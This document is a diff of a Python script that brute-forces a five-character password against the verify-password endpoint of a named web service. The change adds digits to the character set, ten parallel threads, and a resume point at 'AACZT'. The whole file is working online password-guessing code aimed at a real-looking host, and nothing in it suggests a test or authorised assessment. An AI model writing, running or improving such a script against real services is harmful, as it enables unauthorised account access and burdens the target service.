@@ -1,28 +1,57 @@
 import requests
 import string
 from itertools import product
+from concurrent.futures import ThreadPoolExecutor
 
 # API URL
 url = "https://secret.corgi.insure/api/verify-password"
 
-# Characters to try: uppercase A-Z
-characters = string.ascii_uppercase
+# Characters to try: uppercase A-Z and digits 0-9
+characters = string.ascii_uppercase + string.digits
+
+# Function to check the password
+def check_password(combo):
+    password = ''.join(combo)
+    payload = {"password": password}
+    print(f"Trying: {password}")
+
+    try:
+        # Make a POST request
+        response = requests.post(url, json=payload)
+        if response.status_code == 200 and response.json().get("success", False):
+            print(f"Password found: {password}")
+            return True
+    except requests.RequestException as e:
+        print(f"Request failed: {e}")
+
+    return False
 
 def brute_force_password():
     # Generate all combinations of 5 characters
-    for combo in product(characters, repeat=5):
-        password = ''.join(combo)
-        payload = {"password": password}
-        
-        # Make a POST request
-        response = requests.post(url, json=payload)
-        
-        if response.status_code == 200 and response.json().get("success", False):
-            print(f"Password found: {password}")
-            return
+    combinations = product(characters, repeat=5)
+
+    # Flag to start checking from AACZT
+    start_checking = False
+
+    # Use ThreadPoolExecutor for parallel requests
+    with ThreadPoolExecutor(max_workers=10) as executor:  # You can adjust max_workers as needed
+        futures = {}
+
+        for combo in combinations:
+            if not start_checking:
+                if ''.join(combo) == "AACZT":
+                    start_checking = True
+                else:
+                    continue  # Skip until we reach AACZT
+
+            # Submit tasks for parallel execution
+            futures[executor.submit(check_password, combo)] = combo
+
+        for future in futures:
+            if future.result():  # If a password is found, exit
+                return
 
     print("Password not found.")
 
 # Run the script
 brute_force_password()
-
